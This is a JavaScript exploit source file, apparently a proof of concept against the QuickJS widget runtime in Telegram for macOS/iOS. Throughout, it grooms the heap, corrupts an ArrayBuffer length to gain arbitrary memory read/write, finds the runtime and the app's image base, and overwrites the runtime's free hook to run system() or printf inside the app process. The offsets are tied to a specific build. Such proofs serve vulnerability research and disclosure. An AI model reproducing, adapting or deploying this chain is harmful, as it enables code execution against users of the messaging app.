/* PROXY BUILD ONLY - offsets from macOS Telegram 13.1.0 (283434). Rebuild with the 13.2.0 IPA. */
/* PR#1827 (JS_RegExpDelete stale bytecode) -> class-64 ArrayBuffer byte_length
 * -> BigInt64 pivot -> system(cmd).  v6: reliable main-context selection.
 *
 * v3 recovered ctx from the prototype chain of the pad view it found.  That
 * view can be a *stale* JSObject left in a recycled arena page by an earlier
 * widget session: class_29/30 and the corrupted count still match, but its
 * shape/proto/constructor belong to a dead or foreign runtime.  The hook then
 * lands on the wrong JSRuntime and the BIG free never reaches system().
 *
 * v6 fixes that with three independent guards:
 *   1. NONCE  - the corrupted byte_length carries a per-run random value, so a
 *               stale view from an earlier run has a different count and is
 *               skipped by the scan.
 *   2. MAGIC  - a random 64-bit marker is written through the current victim's
 *               own Uint8Array and read back through the pivoted candidate
 *               view.  Only a view whose u.ptr is *this* victim's data block
 *               can pass, so a stale u.ptr can never become cmdAddr/D.
 *   3. ARENA  - the JSRuntime is derived from the allocator arena that owns D
 *               (block header -> sub-arena -> arena_list head), which is by
 *               construction the runtime executing this script.  No JSObject,
 *               JSShape, JSContext or prototype layout is involved.
 * The prototype chain is kept as a cross-check / fallback (SRC=BOTH/CTX).
 *
 * One synchronous String.prototype.replace(); no timers, no second eval.
 */
var CFG = {
  /* --- iOS endgame (filled by make_ios_payload.py) --- */
  JS_DEF_FREE: 0x3127cd8,
  JS_DEF_MALLOC: 0x3127cd0,
  STUB_PRINTF: 0x5493a20,
  STUB_PUTS: 0x0,
  STUB_FFLUSH: 0x5492f40,
  PROOF_ADDR: 0x0,
  FFLUSH_ADDR: 0x0,
  STUB_DLSYM: 0x0,
  SYSTEM_ADDR: 0x0,
  MARKER: "IOSPORT_R1827_OK\n",
  CMD: "echo IOSPORT_SYSTEM_OK",
  FILL64: 4000,
  FILL80: 400,
  NV:     32,
  NW:     8,
  LIM:    8192,
  DBG:    0,
  NONCE:  1,
  MAGIC:  1,
  ARENA:  1,
  POISON: 0,
  CTXCHK: 1,
  DRY:    0
};
var RESULT = 'START';
function setres(s) {
  RESULT = s;
  try { globalThis.RESULT = s; } catch (e) {}
  try { if (typeof console !== 'undefined' && console && console.log)
          console.log('R1827:' + s); } catch (e) {}
  try { if (typeof document !== 'undefined' && document && document.getElementById) { var __o = document.getElementById('iosout'); if (__o) __o.textContent = String(s); } } catch (e) {}
  try { if (typeof print !== 'undefined') print('R1827:' + s); } catch (e) {}
}
function plausible(v) {
  return v > 0x10000n &&
         (v & 0x00ffffffffffffffn) > 0x10000n &&
         (v & 0x00ffffffffffffffn) < 0x0001000000000000n &&
         (v & 7n) === 0n;
}
function codeok(v) {
  return v > 0x10000n && v < 0x0001000000000000n && (v & 3n) === 0n;
}
function hex(v) { return '0x' + (v & 0x00ffffffffffffffn).toString(16); }

/* A JSRuntime starts with JSMallocFunctions mf[5] and JSMallocState
 * {count,size,limit,opaque}; mf.free is rt+16 and the opaque passed to it is
 * rt+64.  mf.malloc/realloc/usable_size are code pointers, which is a strong
 * "this really is a JSRuntime" signature. */
function looksLikeRt(rt, rd) {
  if (!(rt > 0x10000n && (rt & 0x0fn) === 0n &&
        (rt & 0x00ffffffffffffffn) < 0x0001000000000000n)) return false;
  var f1 = rd(rt + 24n), f2 = rd(rt + 32n);
  return codeok(rd(rt + 16n)) && codeok(f1) && codeok(f2);
}

(function () {
  /* ---------------- per-run nonce in the corrupted byte_length -------------- */
  var BN = 0x7a000000;                     /* byte_length of write #0 */
  if (CFG.NONCE) {
    var K = 0;
    try { K = (Math.random() * 0x800000) | 0; } catch (e) {}
    try { K = (K ^ (Date.now() & 0x7fffff)) & 0x7fffff; } catch (e) {}
    BN = 0x7a000000 + 8 * K;               /* 8-aligned, < 0x7e000000 */
  }
  /* random 64-bit marker written into the current victim's data block */
  var MAG = 0n;
  if (CFG.MAGIC) {
    var mh = 0, ml = 0;
    try { mh = (Math.random() * 0x100000000) >>> 0;
          ml = (Math.random() * 0x100000000) >>> 0; } catch (e) {}
    MAG = (BigInt(mh) << 32n) | BigInt(ml);
    if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  }
  if (CFG.DBG) setres('NONCE=' + hex(BigInt(BN)) + ' MAG=' + hex(MAG));

  var oldpat = 'abcdefghij'.repeat(12);
  var re = new RegExp(oldpat, 'g');
  var BIG = new Uint8Array(4096);   /* legacy trigger block (kept in KEEP) */
  var TRIG = new Uint8Array(4096);  /* v6 trigger: never stored in KEEP, so
                                       TRIG=null frees a >512 B block at once */
  var batch = [];
  for (var f = 0; f < CFG.FILL64; f++) batch.push(new ArrayBuffer(16));
  for (var f = 0; f < CFG.FILL80; f++) batch.push('F'.repeat(47));

  var victims = null, padA = null, padB = null, keep = null;
  function mkbuf(sz) {
    var b = new Uint8Array(sz);
    b.fill(0);
    b[2] = 2; b[3] = 3;                   /* alloc_count 7 */
    var o = 8;
    b[o++] = 19; b[o++] = 0;
    b[o++] = 20; b[o++] = 0;
    for (var j = 1; j <= CFG.NW; j++) {
      b[o++] = 27; b[o++] = 8 * j - 4;    /* set_i32 -> capture + 64*j */
      var v = BN + 8 * j;                 /* per-run nonce + per-block tag */
      b[o++] = v & 0xff; b[o++] = (v >> 8) & 0xff;
      b[o++] = (v >> 16) & 0xff; b[o++] = (v >> 24) & 0xff;
    }
    b[o++] = 16;
    return b;
  }
  var LI = { valueOf: function () {
    re.compile('x', 'g');
    /* 454 targets class 480, 480 targets class 512: the freed DynBuf is
       reclaimed by whichever class it actually is, and both hold the program. */
    keep = [mkbuf(454), mkbuf(480)];
    var tmpAb = new ArrayBuffer(16);
    victims = []; padA = []; padB = [];
    for (var i = 0; i < CFG.NV; i++) {
      padA.push({});
      victims.push(new ArrayBuffer(72));
      padB.push({});
    }
    tmpAb = null;
    return 0;
  }};
  Object.defineProperty(re, 'exec', {
    configurable: true,
    get: function () {
      Object.defineProperty(re, 'exec', {
        value: RegExp.prototype.exec, writable: true, configurable: true
      });
      re.lastIndex = LI;
      return RegExp.prototype.exec;
    }
  });
  try { 'a'.replace(re, ''); }
  catch (e) { setres('EXC_REPLACE'); return; }
  globalThis.R1827_KEEP = [batch, victims, padA, padB, keep, BIG];

  /* ---------------- collect one *verified* forward pad view per victim ------
   * A candidate must have class 29/30 and the run-unique count.  If MAGIC is
   * on, its u.ptr must additionally read back the marker written through the
   * current victim's Uint8Array, i.e. it is a view over THIS data block. */
  function writeMag(buf, v) {
    for (var i = 0; i < 8; i++) buf[i] = Number((v >> BigInt(8 * i)) & 0xffn);
  }
  var V = [], nStale = 0;
  for (var i = 0; i < victims.length; i++) {
    var u8;
    try { u8 = new Uint8Array(victims[i]); } catch (e) { continue; }
    var L = u8.length;
    if (!(L > 0x100000 && L < 0x80000000)) continue;
    var elem = L >>> 3;
    padA[i] = null;
    var va;
    try { va = new BigInt64Array(victims[i]); } catch (e) { continue; }
    padB[i] = null;
    var vb;
    try { vb = new BigUint64Array(victims[i]); } catch (e) { continue; }
    var us;
    try { us = new Uint32Array(victims[i]); } catch (e) { continue; }
    if (va.length !== elem || vb.length !== elem) continue;

    /* up to 4 candidate JSObjects in the forward window */
    var offs = [];
    for (var off = 0; off + 72 < CFG.LIM; off += 8) {
      var cid = (us[(off + 16) >>> 2] >>> 16) & 0xffff;
      if (cid !== 29 && cid !== 30) continue;
      if ((us[(off + 64) >>> 2] >>> 0) !== elem) continue;
      offs.push(off, cid);
      if (offs.length >= 8) break;
    }
    if (!offs.length) continue;

    var pickOff = -1, pickCls = -1, pickD = 0n;
    for (var oi = 0; oi < offs.length; oi += 2) {
      var coff = offs[oi], ccls = offs[oi + 1];
      var Dc = BigInt.asUintN(64, va[(coff + 56) >>> 3]);
      if (!(Dc > 0x10000n && (Dc & 7n) === 0n)) continue;
      if (!CFG.MAGIC) { pickOff = coff; pickCls = ccls; pickD = Dc; break; }
      var fv = (ccls === 29 ? va : vb);
      var ov = (ccls === 29 ? vb : va);
      var ridx = (coff + 56) >> 3;
      if (ridx < 0 || ridx >= ov.length) continue;
      writeMag(u8, MAG);                 /* into THIS victim's data block */
      ov[ridx] = Dc;
      if (BigInt.asUintN(64, fv[0]) === MAG) {   /* reads at absolute Dc */
        pickOff = coff; pickCls = ccls; pickD = Dc; break;
      }
      nStale++;
    }
    if (pickOff < 0) continue;
    V.push({ va: va, vb: vb, us: us, u8: u8, k: pickOff, cls: pickCls, D: pickD });
  }
  setres('VIEWS=' + V.length + (nStale ? ' stale=' + nStale : ''));
  if (CFG.DBG) {
    for (var di = 0; di < V.length && di < 8; di++)
      setres('DBG view' + di + ' k=' + V[di].k + ' cls=' + V[di].cls +
             ' D=' + hex(V[di].D));
  }
  if (CFG.DRY) { setres('DRY'); return; }
  if (V.length < 1) { setres('NO_VIEWS' + (nStale ? ' stale=' + nStale : '')); return; }

  /* --- stable writer W + re-pivotable reader R, both over the same victim --- */
  var ENT = null;
  for (var vi = 0; vi < V.length; vi++) {
    var vv = V[vi];
    var idx = (vv.k + 56) >> 3;
    if (idx < 0 || idx >= vv.vb.length) continue;
    ENT = vv; break;
  }
  if (ENT === null) { setres('NO_WR'); return; }
  var Wb = (ENT.cls === 29 ? ENT.vb : ENT.va);   /* writer view */
  var Rb = (ENT.cls === 29 ? ENT.va : ENT.vb);   /* reader view */
  var Ridx = (ENT.k + 56) >> 3;
  var D = ENT.D;
  if (CFG.DBG) setres('DBG WR k=' + ENT.k + ' idx=' + Ridx + ' D=' + hex(D));

  function setR(T) { Wb[Ridx] = T; }
  function RD(A) { setR(A); return BigInt.asUintN(64, Rb[0]); }   /* absolute */
  function rd64(A) {
    var d = A - D;
    if (d >= 0n && (d & 7n) === 0n) {
      var j = Number(d >> 3n);
      if (j < Wb.length) return BigInt.asUintN(64, Wb[j]);
    }
    return RD(A);
  }
  function wr64(A, val) {
    var d = A - D;
    if (d >= 0n && (d & 7n) === 0n) {
      var j = Number(d >> 3n);
      if (j < Wb.length) { Wb[j] = val; return; }
    }
    setR(A); Rb[0] = val;
  }

  /* re-verify the marker through the pivot: D must be this victim's base */
  if (CFG.MAGIC) {
    if (RD(D) !== MAG) { setres('NO_D'); return; }
  }

  if (CFG.POISON) {
    /* lab control: make the view's shape unusable; the arena source must carry */
    wr64(D + BigInt(ENT.k) + 24n, 0x1000n);
  }

  /* ---------------- runtime from the allocator arena that owns D -------------
   * 72799 (device) sub-arena layout: group* +32, block_size_idx +40,
   *   n_used +42, n_blocks +44, first_free +46, block headers at +48.
   * lab (quickjs-ng 7a23d8e) layout: header at +32, block headers at +40.
   * In both layouts block headers are D-8-80*idx, the arena header word is at
   * D-16-80*idx, and the arena's link list node is at B+16; the list head is
   * rt+0x48+16*idx (idx=8 for 80-byte blocks).  The 8 bytes below the header
   * disambiguate: device = group pointer (its +16 is a 64 KiB mmap base),
   * lab = link.prev. */
  var rtArena = 0n, arenaErr = '', aLog = '';
  if (CFG.ARENA) {
    try {
      var Dc = D & 0x00ffffffffffffffn;
      var hdr = RD(Dc - 8n);
      var bidx = Number(hdr & 0xffffn);
      var bsi = Number((hdr >> 16n) & 0xffn);
      if (bsi !== 8 || bidx >= 64) arenaErr = 'NO_ARENA_HDR';
      else {
        var H = Dc - 16n - BigInt(bidx) * 80n;
        var hq = RD(H);
        var cls2 = Number(hq & 0xffn);
        var nb = Number((hq >> 32n) & 0xffffn);
        if (cls2 !== 8 || nb < 10 || nb > 63 || bidx >= nb) arenaErr = 'NO_ARENA';
        else {
          var g = RD(H - 8n);
          var lay = 1;                      /* 1 = lab, 0 = device */
          if (plausible(g)) {
            var mb = RD(g + 16n);
            var sub = H - 40n;
            if (mb > 0x10000n && (mb & 0xfffn) === 0n &&
                sub >= mb && sub < mb + 0x10000n &&
                ((sub - mb) & 0xfffn) === 0n) {
              lay = 0;
              /* 72799: an in-use JSArenaGroup is linked in rt+0x428..0x430,
                 and its +0 field is the list head rt+0x428.  This is an
                 O(1) runtime leak: no arena_list traversal needed. */
              var gl = RD(g);
              if (plausible(gl)) {
                var rg = (gl - 1064n) & 0x00ffffffffffffffn;
                if ((rg & 0x0fn) === 0n && looksLikeRt(rg, RD)) {
                  rtArena = rg;
                  aLog = 'g0 nb=' + nb + ' bidx=' + bidx + ' rt=' + hex(rg);
                }
              }
            }
          }
          if (rtArena === 0n) {
            var hoff = (lay === 0 ? 40 : 32);
            var B = H - BigInt(hoff);
            var start = B + 16n;
            var P = start, head = 0n, steps = 0, cyc = false;
            for (steps = 0; steps < 4096; steps++) {
              var nxt = RD(P) & 0x00ffffffffffffffn;
              if (!plausible(nxt)) { arenaErr = 'NO_LINK'; break; }
              var cand = nxt - 16n;
              var okA = false;
              if (plausible(cand)) {
                var q2 = RD(cand + BigInt(hoff));
                var c2 = Number(q2 & 0xffn);
                var n2 = Number((q2 >> 32n) & 0xffffn);
                okA = (c2 === 8 && n2 >= 10 && n2 <= 63);
              }
              if (okA) {
                if (nxt === start) { cyc = true; head = P; break; }
                P = nxt;
                continue;
              }
              head = nxt; break;
            }
            if (head !== 0n) {
              var rt2 = (head - 0x48n - 8n * 16n) & 0x00ffffffffffffffn;
              aLog = 'lay=' + lay + ' nb=' + nb + ' bidx=' + bidx +
                     ' steps=' + steps + ' head=' + hex(head);
              if (looksLikeRt(rt2, RD)) rtArena = rt2;
              else arenaErr = 'BAD_RT';
            } else if (arenaErr === '' && !cyc) arenaErr = 'NO_HEAD' + steps;
            if (cyc) arenaErr = 'CYCLE';
          }
        }
      }
    } catch (e) { arenaErr = 'EXC_ARENA'; }
  }

  /* ---------------- context from the prototype chain (secondary) ------------ */
  var ctx = 0n, rtCtx = 0n, ctxErr = '';
  if (CFG.CTXCHK) {
  try {
    var shape = rd64(D + BigInt(ENT.k) + 24n);
    if (!plausible(shape)) ctxErr = 'NO_SHAPE';
    if (!ctxErr) {
      var proto = rd64(shape + 48n);
      if (!plausible(proto)) ctxErr = 'NO_PROTO';
      if (!ctxErr) {
        var prop = rd64(proto + 32n);
        if (!plausible(prop)) ctxErr = 'NO_PROP';
        if (!ctxErr) {
          var cands = [];
          setR(prop);
          for (var pi = 0; pi < 8; pi++) {
            var pay = BigInt.asUintN(64, Rb[2 * pi]);
            var tag = BigInt.asUintN(64, Rb[2 * pi + 1]);
            if (tag === 0xffffffffffffffffn && plausible(pay)) cands.push(pay);
          }
          var ctor = 0n;
          for (var ci = 0; ci < cands.length; ci++) {
            setR(cands[ci] + 16n);
            var q2 = BigInt.asUintN(64, Rb[0]);
            if (Number((q2 >> 16n) & 0xffffn) === 12) { ctor = cands[ci]; break; }
          }
          if (CFG.DBG) setres('DBG props=' + cands.length + ' ctor=' + hex(ctor));
          if (ctor === 0n) ctxErr = 'NO_CTOR';
          if (!ctxErr) {
            ctx = rd64(ctor + 48n);
            if (!plausible(ctx)) ctxErr = 'NO_CTX';
            else {
              rtCtx = rd64(ctx + 16n);
              if (!plausible(rtCtx) || !codeok(rd64(rtCtx + 16n))) {
                rtCtx = 0n; ctxErr = 'NO_RT';
              }
            }
          }
        }
      }
    }
  } catch (e) { ctxErr = 'EXC_CTX'; }
  }


  /* ---------------- choose the runtime ------------------------------------- */
  var rt = 0n, src = '';
  if (rtArena !== 0n && rtCtx !== 0n) {
    if ((rtArena & 0x00ffffffffffffffn) === (rtCtx & 0x00ffffffffffffffn)) {
      rt = rtArena; src = 'BOTH';
    } else { rt = rtArena; src = 'ARENA_MM'; }
  } else if (rtArena !== 0n) { rt = rtArena; src = 'ARENA'; }
  else if (rtCtx !== 0n) { rt = rtCtx; src = 'CTX'; }
  else { setres('NO_RT ' + (arenaErr || '') + ' ' + (ctxErr || '')); return; }

  if (CFG.DBG) {
    setres('DBG arena ' + (aLog || arenaErr) + ' rtA=' + hex(rtArena));
    setres('DBG ctx=' + hex(ctx) + ' rtC=' + hex(rtCtx) +
           (ctxErr ? ' err=' + ctxErr : ''));
    setres('DBG RT src=' + src + ' rt=' + hex(rt));
  }
  setres('RT=' + src);

  var js_free = rd64(rt + 16n);
  if (!codeok(js_free)) { setres('NO_FREE'); return; }

    /* ======================= iOS endgame (v1) ==============================
   *
   * Replaces the Android ELF/system() tail of
   * telegramandroidwidget/lab/regexp1827_class64/device_payload_v7_universal.js
   *
   * Inputs (already defined by the primitive):
   *   rt      JSRuntime* of the running widget runtime
   *   js_free rt->mf.js_free (js_def_free, a stub in TelegramUIFramework)
   *   D       address of the victim Uint8Array data block (user data)
   *   ENT     victim object ({u8: Uint8Array view over D, ...})
   *   TRIG    Uint8Array(4096) large block that frees synchronously
   *   BIG     Uint8Array(4096) second large block
   *   rd64/wr64, codeok, hex, setres
   *
   * New CFG fields (filled by make_ios_payload.py from the IPA):
   *   JS_DEF_FREE   offset of js_def_free in the Mach-O image (0 = scan)
   *   STUB_PRINTF   offset of the app's `printf` stub        (0 = no proof)
   *   STUB_FFLUSH   offset of the app's `fflush` stub        (0 = no flush)
   *   SYSTEM_ADDR   absolute libc system() address, optional
   *   MARKER        fixed ASCII marker (no '%' unless escaped)
   *
   * The proof is a single `printf(marker)` executed inside the Telegram
   * process through rt->mf.js_free.  Return value is ignored by js_free_rt,
   * so the runtime continues.  Launch Telegram with
   * `developer dvt launch --stream` to capture stdout.
   * ====================================================================== */

  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  var opaque0 = rd64(rt + 64n);

  /* ---- 1. image base: js_free - js_def_free_offset ---------------------- */
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n && CFG.JS_DEF_MALLOC) {
    /* Some builds initialize mf.js_free to libc free; js_malloc is still the
       quickjs js_def_malloc stub. */
    var jm = rd64(rt + 8n);
    if (codeok(jm)) {
      base = u64(jm - BigInt(CFG.JS_DEF_MALLOC));
      if ((rd32(base) >>> 0) !== 0xfeedfacf) base = 0n;
    }
  }
  if (base === 0n) {
    /* Fallback: 16 KiB steps (the iOS arm64 page/mapping alignment), then a
       4 KiB refine.  The 109 MB UI framework needs at most ~7k reads. */
    var p0 = u64(js_free) & ~0x3fffn;
    for (var si = 0; si < 0x2000; si++) {
      var a = p0 - BigInt(si) * 0x4000n;
      if (a < 0x10000n) break;
      if ((rd32(a) >>> 0) === 0xfeedfacf) { base = a; break; }
    }
    if (base === 0n) {
      var p1 = u64(js_free) & ~0xfffn;
      for (var sj = 0; sj < 0x1000; sj++) {
        var a2 = p1 - BigInt(sj) * 0x1000n;
        if (a2 < 0x10000n) break;
        if ((rd32(a2) >>> 0) === 0xfeedfacf) { base = a2; break; }
      }
    }
  }
  if (base === 0n) { setres('IOS_NO_BASE'); return; }
  if (CFG.DBG) setres('DBG base=' + hex(base) + ' jsfree=' + hex(js_free));

  /* ---- 2a. optional system(cmd): only if SYSTEM_ADDR was supplied ------ */
  if (CFG.SYSTEM_ADDR) {
    var cmd = CFG.CMD, n = cmd.length;
    for (var ci = 0; ci < n; ci++) ENT.u8[ci] = cmd.charCodeAt(ci) & 0xff;
    ENT.u8[n] = 0;
    setres('IOS_HOOK_SYSTEM');
    wr64(rt + 16n, BigInt(CFG.SYSTEM_ADDR));
    wr64(rt + 64n, D);
    try { TRIG = null; } catch (e) { setres('IOS_EXC_SYS'); return; }
    wr64(rt + 16n, js_free);
    wr64(rt + 64n, opaque0);
    setres('IOS_AFTER_SYSTEM');
    return;
  }

  /* ---- 2b. printf/puts(marker) proof ---------------------------------- */
  var proofAddr = 0n, proofName = '';
  if (CFG.PROOF_ADDR) {
    proofAddr = BigInt(CFG.PROOF_ADDR);
    proofName = 'ABS';
  } else if (CFG.STUB_PRINTF) {
    proofAddr = base + BigInt(CFG.STUB_PRINTF);
    proofName = 'PRINTF';
  } else if (CFG.STUB_PUTS) {
    proofAddr = base + BigInt(CFG.STUB_PUTS);
    proofName = 'PUTS';
  } else {
    setres('IOS_NO_PRINTF_STUB');
    return;
  }
  /* A wrong stub offset must not become a wild branch: __stubs entries start
     with `adrp x16, …` (0x9xxxxxxx) or a direct `b` (0x14xxxxxx). */
  function isStubAddr(p) {
    var w = rd32(p) >>> 0;
    return ((w & 0x9f000000) >>> 0) === 0x90000000 ||
           ((w & 0xfc000000) >>> 0) === 0x14000000;
  }
  if (!CFG.PROOF_ADDR && !isStubAddr(proofAddr)) {
    setres('IOS_BAD_PROOF_STUB ' + hex(proofAddr));
    return;
  }
  var marker = CFG.MARKER || 'IOSPORT_R1827_OK\n';
  var mn = marker.length;
  for (var mi = 0; mi < mn; mi++) ENT.u8[mi] = marker.charCodeAt(mi) & 0xff;
  ENT.u8[mn] = 0;

  setres('IOS_HOOK_' + proofName + ' base=' + hex(base));
  wr64(rt + 16n, proofAddr);        /* rt->mf.js_free = printf/puts */
  wr64(rt + 64n, D);                /* opaque = marker string */
  try { TRIG = null; } catch (e) { setres('IOS_EXC_PRINTF'); return; }
  wr64(rt + 16n, js_free);          /* restore before anything else */
  wr64(rt + 64n, opaque0);

  /* ---- 3. fflush(NULL): flush the stdio buffer ------------------------ */
  if (CFG.FFLUSH_ADDR || CFG.STUB_FFLUSH) {
    var fflushAddr = CFG.FFLUSH_ADDR ? BigInt(CFG.FFLUSH_ADDR)
                                     : base + BigInt(CFG.STUB_FFLUSH);
    if (!CFG.FFLUSH_ADDR && !isStubAddr(fflushAddr)) {
      setres('IOS_BAD_FFLUSH_STUB ' + hex(fflushAddr));
    } else {
      var FL = null;
      try { FL = new Uint8Array(4096); } catch (e) { FL = null; }
      if (FL) {
        wr64(rt + 16n, fflushAddr);
        wr64(rt + 64n, 0n);
        try { FL = null; } catch (e) {}
        wr64(rt + 16n, js_free);
        wr64(rt + 64n, opaque0);
      }
    }
  }

  setres('IOS_OK base=' + hex(base) + ' proof=' + hex(proofAddr));
  try {
    if (typeof document !== 'undefined' && document && document.body) {
      document.body.setAttribute('data-iosport', 'IOS_OK');
    }
  } catch (e) {}
})();
